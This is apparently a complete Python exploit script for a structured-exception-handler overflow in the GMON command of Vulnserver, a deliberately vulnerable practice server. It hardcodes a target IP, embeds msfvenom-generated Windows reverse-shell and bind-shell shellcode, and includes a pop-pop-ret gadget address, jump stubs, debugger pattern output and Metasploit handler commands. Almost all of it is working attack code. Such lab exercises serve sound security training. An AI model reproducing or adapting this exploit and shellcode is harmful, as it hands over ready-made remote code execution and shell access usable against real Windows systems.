# Vuln Server Source Code: https://github.com/stephenbradshaw/vulnserver/blob/master/vulnserver.c


# } else if (strncmp(RecvBuf, "GMON ", 5) == 0) {
# 				char GmonStatus[13] = "GMON STARTED\n";
# 				for (i = 5; i < RecvBufLen; i++) {
# 					if ((char)RecvBuf[i] == '/') {
# 						if (strlen(RecvBuf) > 3950) {
# 							Function3(RecvBuf);
# 						}
# 						break;
# 					}
# 				}
# SendResult = send( Client, GmonStatus, sizeof(GmonStatus), 0 );

# void Function3(char *Input) {
# 	char Buffer2S[2000];
# 	strcpy(Buffer2S, Input);
# }


import socket, sys

IP = '35.182.31.212'

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((IP, 9999))
sock.recv(1024)

# msfvenom -a x64 --platform Windows -p windows/x64/meterpreter/reverse_tcp LHOST=172.31.10.39 LPORT=4444 -e x64/xor -b '\x00\x0a\x0d' -i 3 -f python

reverse_tcp_x64 =  b""
reverse_tcp_x64 += b"\x48\x31\xc9\x48\x81\xe9\xb6\xff\xff\xff\x48\x8d\x05"
reverse_tcp_x64 += b"\xef\xff\xff\xff\x48\xbb\xb3\x35\xf0\x30\xcd\x37\x6b"
reverse_tcp_x64 += b"\x20\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4"
reverse_tcp_x64 += b"\xfb\x04\x39\x78\x4c\xde\xd0\xdf\x4c\xca\xb8\xbd\xc8"
reverse_tcp_x64 += b"\xd8\x94\xdf\x4c\x7d\x4b\xa1\x21\x39\x4a\x29\x6e\x14"
reverse_tcp_x64 += b"\x6f\x78\xfc\x6f\x4c\x68\x9e\xcd\x0f\xcf\x32\xd5\x9f"
reverse_tcp_x64 += b"\xf9\x6e\xf2\x99\xb8\xf9\xd6\x0b\x4e\xa0\x73\x5c\x3c"
reverse_tcp_x64 += b"\xff\xe9\x0b\x4e\x17\x80\x53\x35\x80\xfa\xbb\x3a\x51"
reverse_tcp_x64 += b"\xb6\x99\x08\x48\x31\xbc\x9c\xa7\xc4\x2e\xc6\xf2\xe2"
reverse_tcp_x64 += b"\x8a\xf5\x4c\x33\x6e\x5a\xd2\x9b\x76\xbd\x8e\x86\xdf"
reverse_tcp_x64 += b"\xe2\x4c\xca\x20\xf5\xfe\x05\xfb\xfa\x95\xc9\x16\xf5"
reverse_tcp_x64 += b"\x44\x85\x86\xfa\x95\xc9\x56\xf5\x44\xa5\xce\xfa\x11"
reverse_tcp_x64 += b"\x2c\x3c\xf7\x82\xe6\x57\xfa\x2f\x5b\xda\x81\xae\xab"
reverse_tcp_x64 += b"\x9c\x9e\x3e\xda\xb7\x74\xc2\x96\x9f\x73\xfc\x76\x24"
reverse_tcp_x64 += b"\xfc\x9e\x9f\x15\xe0\x3e\x10\x34\x81\x87\xd6\x4e\xd4"
reverse_tcp_x64 += b"\x9f\xe3\x6e\xb6\xcd\xd8\x1b\xc0\x1e\x9b\x76\x36\x4f"
reverse_tcp_x64 += b"\x5f\x9e\xb2\x1e\xd3\xf3\x7d\xbb\xb0\xd6\xb3\xce\xcb"
reverse_tcp_x64 += b"\xfd\xf5\xd7\x93\x15\xf2\x3e\xd2\x77\x6d\x2c\x81\xd6"
reverse_tcp_x64 += b"\x4d\xd7\xda\xfd\x89\x47\x9f\x9f\x64\x53\xaa\xbf\xf5"
reverse_tcp_x64 += b"\xfe\x17\x32\xf3\xdf\x52\x7b\xfc\xce\x16\xa6\x52\x6b"
reverse_tcp_x64 += b"\x6a\x3a\xbe\x83\xf3\x96\xf7\x27\x4a\x03\x65\x97\x93"
reverse_tcp_x64 += b"\x15\xf2\x3a\xd2\x77\x6d\xa9\x96\x15\xbe\x56\xdf\xfd"
reverse_tcp_x64 += b"\xfd\xd3\x9e\x9f\x62\x5f\x10\x72\x35\x87\xd6\x4e\xf3"
reverse_tcp_x64 += b"\x46\xda\x2e\xe3\x96\x8d\xdf\xea\x5f\xc2\x37\xe7\x87"
reverse_tcp_x64 += b"\x54\x72\x92\x5f\xc9\x89\x5d\x97\x96\xc7\xe8\x56\x10"
reverse_tcp_x64 += b"\x64\x54\x84\x28\x61\x4d\x43\xd2\xc8\xca\xbc\xe5\xc1"
reverse_tcp_x64 += b"\x81\x2c\x9b\x76\xfc\x99\x9e\x17\x54\x56\x1a\x9a\x1d"
reverse_tcp_x64 += b"\xce\xd7\x9e\xfb\x97\x7e\x3f\x01\xcd\xd7\x8f\xee\xb2"
reverse_tcp_x64 += b"\x84\x7c\x9a\x8e\x83\xd7\x3b\xfa\xd7\xff\x4c\x8e\x6d"
reverse_tcp_x64 += b"\xd2\xc5\x38\x9c\x89\x68\x83\x5e\x74\xda\x1f\x9a\x76"
reverse_tcp_x64 += b"\xbd\x96\x96\x24\x9b\x9e\xf0\x76\x42\x1a\xbd\x94\xf3"
reverse_tcp_x64 += b"\x40\xcb\x26\xf0\xfe\x1e\xd3\x83\xde\xd3\x89\x7d\x87"
reverse_tcp_x64 += b"\x5e\x5c\xfa\xe1\x5b\x3e\x34\x0e\x96\x24\x58\x11\x44"
reverse_tcp_x64 += b"\x96\x42\x1a\x9f\x17\x75\x74\x8b\x37\xe5\x83\x5e\x7c"
reverse_tcp_x64 += b"\xfa\x97\x62\x37\x07\x56\x72\xea\xd3\xe1\x4e\xf3\x7d"
reverse_tcp_x64 += b"\xbb\xdd\xd7\x4d\xd0\xee\x93\x55\x5c\xd7\x9e\xb2\x56"
reverse_tcp_x64 += b"\x18\x9a\xad\x87\x5e\x7c\xff\x2f\x52\x1c\xb9\x8e\x8f"
reverse_tcp_x64 += b"\xd6\x3b\xe7\xda\xcc\xbf\x16\x1f\xc1\x4d\xcb\x18\x8e"
reverse_tcp_x64 += b"\xbd\xb1\x82\xd6\x31\xda\xbb\x28\x34\x39\xbd\xde\xf3"
reverse_tcp_x64 += b"\x47\xf3\x76\xad\xcf\xd7\xdf\xea\x56\x12\x84\xf5\xfe"
reverse_tcp_x64 += b"\x1e\xdf\x08\x46\x3f\x25\x58\x30\x02\xd6\x3b\xdd\xd2"
reverse_tcp_x64 += b"\xff\x7a\x82\xe6\x57\xfb\x97\x6b\x3e\x34\x15\x9f\x17"
reverse_tcp_x64 += b"\x4b\x5f\x21\x74\x64\x07\x88\x61\x67\x9d\x63\x76\xc0"
reverse_tcp_x64 += b"\xe7\x8f\xdf\xe5\x47\xf3\x76\xfd\xcf\xd7\xdf\xea\x74"
reverse_tcp_x64 += b"\x9b\x2c\xfc\x75\xdc\xb1\xbd\x2e\x64\xa3\xea\x96\x96"
reverse_tcp_x64 += b"\x24\xc7\x70\xd6\x17\x42\x1a\x9e\x61\x7c\xf7\xa7\x89"
reverse_tcp_x64 += b"\x42\x30\x9f\x9f\x71\x56\xb2\xb0\xf5\x4a\x21\xeb\x06"
reverse_tcp_x64 += b"\x5f\x64\x91\xe5\xa5\xd7\xc7\xfb\xd9\x59\x86\x08\x6d"
reverse_tcp_x64 += b"\x81\x61\x67\x1e\x9b\xf4\x20"


# msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e x86/shikata_ga_nai -b '\x00\x0a\x0d' -i 3 -f python
bind_shell =  b""
bind_shell += b"\xdb\xd5\xd9\x74\x24\xf4\xbe\x61\x26\xa7\xcb\x5d\x33"
bind_shell += b"\xc9\xb1\x5b\x31\x75\x1a\x03\x75\x1a\x83\xed\xfc\xe2"
bind_shell += b"\x94\x9b\xf3\x10\x77\xda\x22\x6f\xae\x56\xf1\x84\x0f"
bind_shell += b"\xbe\x30\xd5\xfa\x43\x2d\xea\x35\x2b\xbc\x10\x0e\x66"
bind_shell += b"\x03\xdd\x68\xa2\x3d\x5b\x13\xd3\x3a\x84\xf4\x49\xc9"
bind_shell += b"\x74\xde\x26\x0c\xcd\x65\xfd\xa8\x6b\xb1\x5f\x01\xd1"
bind_shell += b"\x7e\xaa\xea\x67\xde\x05\xd8\x48\x0f\x8a\xe3\x34\xfe"
bind_shell += b"\xee\x34\x28\xa3\x91\x5f\xa0\x1e\x56\x5c\x42\x54\x45"
bind_shell += b"\x11\x45\x1c\xda\x3f\x15\x57\xc2\x2a\x64\x97\x47\x72"
bind_shell += b"\x25\xdb\x8f\xee\x8a\x28\x66\x25\x4f\x91\x1e\xa1\xc6"
bind_shell += b"\xc3\x2c\x54\x6f\x22\xb2\x3c\x19\xd4\xdf\x2d\x39\x14"
bind_shell += b"\x63\x80\xcb\x27\x7c\xd9\x3c\x08\x95\x1b\xa1\xf7\x75"
bind_shell += b"\x71\x07\x95\xab\x51\xd4\x55\x40\x08\x47\x5f\x5a\xeb"
bind_shell += b"\x94\xb8\xbc\xb5\xc0\x75\xd6\xf4\x01\x7c\x42\xcb\x2d"
bind_shell += b"\x38\x31\x22\x29\x4f\x04\x6b\xd4\xf3\xa9\xa2\x15\x2a"
bind_shell += b"\x2f\x97\xe8\x6b\xcc\xfe\xd3\x5b\x7f\x6e\x9d\xb8\x3e"
bind_shell += b"\x5a\x24\x03\x6d\x2f\x59\x20\xc4\x32\x9b\xff\xe3\xaa"
bind_shell += b"\xa5\xb0\xad\x84\xa3\xb1\x59\xaa\x0c\x4a\xd6\x5a\xd0"
bind_shell += b"\x5c\xd0\xf8\x38\x54\x14\x78\xd1\x54\xb9\x61\xef\xc1"
bind_shell += b"\x75\xc3\x9a\x5e\x0f\x94\x5a\xa2\x30\x0b\xd4\xe1\xb5"
bind_shell += b"\xf9\x26\xb9\x14\x02\x07\xd4\xcb\x1d\x4d\x10\xf8\x1b"
bind_shell += b"\x50\x67\x16\xaa\x09\xc7\xe6\xfe\x5e\x48\xf9\x36\x9a"
bind_shell += b"\x4b\x68\x98\xa9\xab\xbc\x40\x7f\xe7\xf9\x8e\x79\x60"
bind_shell += b"\x98\xe3\xde\x5a\x79\xa4\x06\x6c\x70\xea\x86\x9c\x41"
bind_shell += b"\x4d\xbe\x5f\xb8\x34\x87\x4f\x58\x55\xc6\x1d\xda\xe2"
bind_shell += b"\xc7\x19\x1e\xbc\x13\xb4\xdf\x89\x2c\x73\x90\x6e\xb1"
bind_shell += b"\xbc\x72\x95\x19\x87\x6d\xa7\x91\xcc\x8e\x54\x68\x48"
bind_shell += b"\x79\x81\x80\xb6\xba\x8f\x12\x1a\x66\x40\xe3\x3e\x79"
bind_shell += b"\xe9\xd9\x5d\xc5\x46\xa5\x05\x4a\xd0\x12\x63\xbc\x3f"
bind_shell += b"\xdf\x56\xde\x4e\xc4\x37\x09\xf2\x91\xf8\x96\x12\x7f"

# Once bound (on kali machine)
# msfconsole -q
# use exploit/multi/handler
# set RHOST 172.31.2.164
# run


# Exploit Info: Windows Server 2008 x64
# [+] Looking for cyclic pattern in memory
#     Cyclic pattern (normal) found at 0x0253f209 (length 3572 bytes)
#     -  Stack pivot between 33 & 3605 bytes needed to land in this pattern
#     Cyclic pattern (normal) found at 0x00943919 (length 4087 bytes)
#     EBP (0x0253f9d8) points at offset 1999 in normal pattern (length 1576)
#     EDX contains normal pattern : 0x32704531 (offset 3575)
#     ECX (0x00944714) points at offset 3579 in normal pattern (length 508)
# [+] Examining SEH chain
#     SEH record (nseh field) at 0x0253ffc4 overwritten with normal pattern : 0x326e4531 (offset 3515), followed by 52 bytes of cyclic data after the handler
# [+] Examining stack (entire stack) - looking for cyclic pattern
#     Walking stack from 0x0253f000 to 0x0253fffc (0x00000ffc bytes)
#     0x0253f20c : Contains normal cyclic pattern at ESP+0x24 (+36) : offset 3, length 3572 (-> 0x0253ffff : ESP+0xe18)
# [+] Examining stack (entire stack) - looking for pointers to cyclic pattern
#     Walking stack from 0x0253f000 to 0x0253fffc (0x00000ffc bytes)
#     0x0253f164 : Pointer into normal cyclic pattern at ESP-0x84 (-132) : 0x0253fc60 : offset 2647, length 928
#     0x0253f168 : Pointer into normal cyclic pattern at ESP-0x80 (-128) : 0x0253f7a0 : offset 1431, length 2144

brk_flag = 0

GMON = "GMON /.:/".encode("ascii")
padding_a = "A".encode("ascii")
padding_c = "C".encode("ascii")
nop = b"\x90"

# @Ref: http://sh3llc0d3r.com/vulnserver-gmon-command-seh-based-overflow-exploit/
# Jumping from 0x0230FFDC to 0x0230FDD7
# Hex Value: 205 Decimal: 517
jmp_to_payload = b"\xD9\xEE\xD9\x74\x24\xF4\x59\x80\xC1\x0A\x90\xFE\xCD\xFE\xCD\xFF\xE1"

# JMP SHORT
jmp_short = b"\xEB\x06\x90\x90"

# essfunc.dll (0x62501000 - 0x62502000) No SEH Protection
# 0x625010b4 : pop ebx # pop ebp # ret  |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\Administrator\Desktop\vulnserver-master\essfunc.dll)
SEH_record = b"\xB4\x10\x50\x62"

# Trigger access violation - Done
# Pointer to next SEH needs to be overwritten with jmp to shellcode
# Current SE handler overwritten and points to pop, pop ret (pop pulls last value added off the stack into register)

# durring prologue of exception handler address of pointer to next SEH was put on the stack at ESP+8, pop pop ret puts this
# address in EIP and allows execution of the code at the address of "pointer to next SEH"

# SEH chain of thread 000002D8
# Address    SE handler
# 0223FFC4   C290C290
# C206ABC3   *** CORRUPT ENTRY ***

# We only have 38 bytes after ptr_next_SEH before end of memory block

# Assemble structure of our payload
# NOP instructions | Reverse Shell payload | Short JMP | NOP | NOP | EIP | Second Stage payload

step1 = GMON
print("Adding Initial Command ({} Bytes) \n".format(sys.getsizeof(step1)))
buffer = step1
print("Buffer Length: {} Size: {} Bytes \n".format(len(buffer), sys.getsizeof(buffer)))

# Need total of 3515 padding to get to JMP
# 3022 Bytes is where payload needs to go
step2 = nop * (3515-len(bind_shell))
print("Adding NOP Padding ({} Bytes) \n".format(sys.getsizeof(step2)))
buffer += step2
print("Buffer Length: {} Size: {} Bytes \n".format(len(buffer), sys.getsizeof(buffer)))

step3 = bind_shell
print("Adding Shellcode ({} Bytes) \n".format(sys.getsizeof(step3)))
buffer += step3
print("Buffer Length: {} Size: {} Bytes \n".format(len(buffer), sys.getsizeof(buffer)))



print("Adding JMP Short \n")
buffer += jmp_short
print("Buffer Length: {} Size: {} Bytes \n".format(len(buffer), sys.getsizeof(buffer)))

print("Adding SEH Pointer \n")
buffer += SEH_record
print("Buffer Length: {} Size: {} Bytes \n".format(len(buffer), sys.getsizeof(buffer)))

if brk_flag:
    print("Adding Breakpoint \n")
    brk = b"\xCC"
    buffer += brk

print("Adding JMP to payload \n")
buffer += jmp_to_payload
print("Buffer Length: {} Size: {} Bytes \n".format(len(buffer), sys.getsizeof(buffer)))


print("Adding Padding for remaining 36 bytes \n")
buffer += nop * (36-len(jmp_to_payload))
print("Buffer Length: {} Size: {} Bytes \n".format(len(buffer), sys.getsizeof(buffer)))


print("Adding Padding to hit necessary length to trigger exception \n")
buffer += nop * (5050 - len(buffer))
print("Buffer Length: {} Size: {} Bytes \n".format(len(buffer), sys.getsizeof(buffer)))


print("Final Buffer Result: \n")
print(buffer)

if len(buffer) < 3950:
    print("Buffer Length insufficient to call Function3")
    print("Exiting...")
    exit(1)

print("Sending {} Bytes... \n".format(sys.getsizeof(buffer)))
sock.sendall(buffer)
sock.close()
print("Done \n")
exit(0)
